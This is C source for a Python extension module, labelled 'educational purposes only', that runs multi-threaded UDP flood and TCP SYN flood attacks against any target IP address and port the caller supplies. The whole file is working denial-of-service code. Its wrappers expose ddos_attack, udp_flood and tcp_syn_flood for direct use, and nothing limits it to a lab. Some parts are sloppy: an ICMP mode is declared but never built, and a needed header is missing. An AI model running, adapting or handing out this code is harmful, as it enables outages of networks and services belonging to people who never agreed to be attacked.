/*
 * Fast DDoS Attack C Extension - Cross-Platform
 * Educational Purpose Only - For Controlled Lab Environment
 * 
 * This C extension provides high-performance DDoS attack simulation
 * with multi-threading and optimized packet generation.
 * Works on both Windows and Linux/Ubuntu.
 */

#include <Python.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32.lib")
    #define close closesocket
    #define sleep(x) Sleep((x) * 1000)
    typedef HANDLE pthread_t;
    typedef HANDLE pthread_mutex_t;
    #define pthread_mutex_init(m, a) (*(m) = CreateMutex(NULL, FALSE, NULL))
    #define pthread_mutex_lock(m) WaitForSingleObject(*(m), INFINITE)
    #define pthread_mutex_unlock(m) ReleaseMutex(*(m))
    #define pthread_mutex_destroy(m) CloseHandle(*(m))
    #define pthread_create(t, a, f, d) (*(t) = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(f), (d), 0, NULL)) ? 0 : -1
    #define pthread_join(t, r) (WaitForSingleObject((t), INFINITE), CloseHandle((t)), 0)
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <pthread.h>
    #include <unistd.h>
    #include <netinet/ip.h>
    #include <netinet/udp.h>
    #include <netinet/tcp.h>
    #include <netinet/ip_icmp.h>
    #include <errno.h>
    #include <sys/types.h>
#endif

#define MAX_THREADS 100
#define PACKET_SIZE 1024
#define DEFAULT_PACKETS_PER_THREAD 1000

typedef struct {
    char target_ip[16];
    int target_port;
    int attack_type; // 0=UDP, 1=TCP, 2=ICMP
    int packets_to_send;
    int thread_id;
    unsigned long* total_packets_sent;
    pthread_mutex_t* stats_mutex;
} ddos_thread_data;

static int networking_initialized = 0;

// Initialize networking (Windows: Winsock, Linux: no-op)
static int init_networking() {
#ifdef _WIN32
    if (!networking_initialized) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return -1;
        }
        networking_initialized = 1;
    }
#else
    networking_initialized = 1; // No special initialization needed on Linux
#endif
    return 0;
}

// Cleanup networking
static void cleanup_networking() {
#ifdef _WIN32
    if (networking_initialized) {
        WSACleanup();
        networking_initialized = 0;
    }
#endif
}

// Cross-platform random number generation
static unsigned int get_random_uint() {
#ifdef _WIN32
    return rand();
#else
    return random();
#endif
}

// UDP flood attack
#ifdef _WIN32
static DWORD WINAPI udp_flood_thread(LPVOID data) {
#else
static void* udp_flood_thread(void* data) {
#endif
    ddos_thread_data* thread_data = (ddos_thread_data*)data;
    int sock;
    struct sockaddr_in target_addr;
    char packet[PACKET_SIZE];
    int packets_sent = 0;
    
    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        return NULL;
    }
    
    // Set up target address
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(thread_data->target_port);
    inet_pton(AF_INET, thread_data->target_ip, &target_addr.sin_addr);
    
    // Fill packet with random data
    for (int i = 0; i < PACKET_SIZE; i++) {
        packet[i] = get_random_uint() % 256;
    }
    
    // Send packets
    for (int i = 0; i < thread_data->packets_to_send; i++) {
        if (sendto(sock, packet, PACKET_SIZE, 0, 
                   (struct sockaddr*)&target_addr, sizeof(target_addr)) > 0) {
            packets_sent++;
        }
        
        // Small delay to prevent overwhelming
        if (i % 100 == 0) {
#ifdef _WIN32
            Sleep(1);
#else
            usleep(1000);
#endif
        }
    }
    
    close(sock);
    
    // Update global statistics
    pthread_mutex_lock(thread_data->stats_mutex);
    *(thread_data->total_packets_sent) += packets_sent;
    pthread_mutex_unlock(thread_data->stats_mutex);
    
    return NULL;
}

// TCP SYN flood attack
#ifdef _WIN32
static DWORD WINAPI tcp_syn_flood_thread(LPVOID data) {
#else
static void* tcp_syn_flood_thread(void* data) {
#endif
    ddos_thread_data* thread_data = (ddos_thread_data*)data;
    int sock;
    struct sockaddr_in target_addr;
    int packets_sent = 0;
    
    // Set up target address
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(thread_data->target_port);
    inet_pton(AF_INET, thread_data->target_ip, &target_addr.sin_addr);
    
    // Send SYN packets
    for (int i = 0; i < thread_data->packets_to_send; i++) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock >= 0) {
            // Set non-blocking mode for connect
#ifdef _WIN32
            u_long mode = 1;
            ioctlsocket(sock, FIONBIO, &mode);
#else
            int flags = fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, flags | O_NONBLOCK);
#endif
            
            // Attempt connection (will send SYN)
            connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
            packets_sent++;
            
            close(sock);
        }
        
        // Small delay
        if (i % 50 == 0) {
#ifdef _WIN32
            Sleep(1);
#else
            usleep(1000);
#endif
        }
    }
    
    // Update global statistics
    pthread_mutex_lock(thread_data->stats_mutex);
    *(thread_data->total_packets_sent) += packets_sent;
    pthread_mutex_unlock(thread_data->stats_mutex);
    
    return NULL;
}

// Main DDoS attack function
static PyObject* fast_ddos_attack(PyObject* self, PyObject* args) {
    char* target_ip;
    int target_port;
    int attack_type;
    int num_threads;
    int packets_per_thread;
    
    if (!PyArg_ParseTuple(args, "siiii", &target_ip, &target_port, &attack_type, 
                          &num_threads, &packets_per_thread)) {
        return NULL;
    }
    
    if (init_networking() != 0) {
        PyErr_SetString(PyExc_RuntimeError, "Failed to initialize networking");
        return NULL;
    }
    
    if (num_threads > MAX_THREADS) {
        num_threads = MAX_THREADS;
    }
    
    // Initialize statistics
    unsigned long total_packets_sent = 0;
    pthread_mutex_t stats_mutex;
    pthread_mutex_init(&stats_mutex, NULL);
    
    // Create thread data
    ddos_thread_data thread_data[MAX_THREADS];
    pthread_t threads[MAX_THREADS];
    
    // Start threads
    for (int i = 0; i < num_threads; i++) {
        strncpy(thread_data[i].target_ip, target_ip, sizeof(thread_data[i].target_ip) - 1);
        thread_data[i].target_ip[sizeof(thread_data[i].target_ip) - 1] = '\0';
        thread_data[i].target_port = target_port;
        thread_data[i].attack_type = attack_type;
        thread_data[i].packets_to_send = packets_per_thread;
        thread_data[i].thread_id = i;
        thread_data[i].total_packets_sent = &total_packets_sent;
        thread_data[i].stats_mutex = &stats_mutex;
        
        void* (*thread_func)(void*) = NULL;
        
        switch (attack_type) {
            case 0: // UDP flood
                thread_func = udp_flood_thread;
                break;
            case 1: // TCP SYN flood
                thread_func = tcp_syn_flood_thread;
                break;
            default:
                thread_func = udp_flood_thread; // Default to UDP
                break;
        }
        
        if (pthread_create(&threads[i], NULL, thread_func, &thread_data[i]) != 0) {
            PyErr_SetString(PyExc_RuntimeError, "Failed to create thread");
            pthread_mutex_destroy(&stats_mutex);
            return NULL;
        }
    }
    
    // Wait for all threads to complete
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_mutex_destroy(&stats_mutex);
    
    return PyLong_FromUnsignedLong(total_packets_sent);
}

// UDP flood wrapper
static PyObject* udp_flood(PyObject* self, PyObject* args) {
    char* target_ip;
    int target_port;
    int num_threads = 10;
    int packets_per_thread = DEFAULT_PACKETS_PER_THREAD;
    
    if (!PyArg_ParseTuple(args, "si|ii", &target_ip, &target_port, 
                          &num_threads, &packets_per_thread)) {
        return NULL;
    }
    
    PyObject* result_args = Py_BuildValue("siiii", target_ip, target_port, 0, 
                                         num_threads, packets_per_thread);
    PyObject* result = fast_ddos_attack(self, result_args);
    Py_DECREF(result_args);
    
    return result;
}

// TCP SYN flood wrapper
static PyObject* tcp_syn_flood(PyObject* self, PyObject* args) {
    char* target_ip;
    int target_port;
    int num_threads = 10;
    int packets_per_thread = DEFAULT_PACKETS_PER_THREAD;
    
    if (!PyArg_ParseTuple(args, "si|ii", &target_ip, &target_port, 
                          &num_threads, &packets_per_thread)) {
        return NULL;
    }
    
    PyObject* result_args = Py_BuildValue("siiii", target_ip, target_port, 1, 
                                         num_threads, packets_per_thread);
    PyObject* result = fast_ddos_attack(self, result_args);
    Py_DECREF(result_args);
    
    return result;
}

// Method definitions
static PyMethodDef FastDDoSMethods[] = {
    {"ddos_attack", fast_ddos_attack, METH_VARARGS, 
     "Perform high-speed DDoS attack"},
    {"udp_flood", udp_flood, METH_VARARGS, 
     "Perform UDP flood attack"},
    {"tcp_syn_flood", tcp_syn_flood, METH_VARARGS, 
     "Perform TCP SYN flood attack"},
    {NULL, NULL, 0, NULL}
};

// Module definition
static struct PyModuleDef fast_ddos_module = {
    PyModuleDef_HEAD_INIT,
    "fast_ddos_attack",
    "High-performance DDoS attack module (Educational purposes only)",
    -1,
    FastDDoSMethods
};

// Module initialization
PyMODINIT_FUNC PyInit_fast_ddos_attack(void) {
    // Initialize random seed
    srand((unsigned int)time(NULL));
    
    PyObject* module = PyModule_Create(&fast_ddos_module);
    if (module == NULL) {
        return NULL;
    }
    
    // Add constants
    PyModule_AddIntConstant(module, "UDP_FLOOD", 0);
    PyModule_AddIntConstant(module, "TCP_SYN_FLOOD", 1);
    PyModule_AddIntConstant(module, "MAX_THREADS", MAX_THREADS);
    
    return module;
}
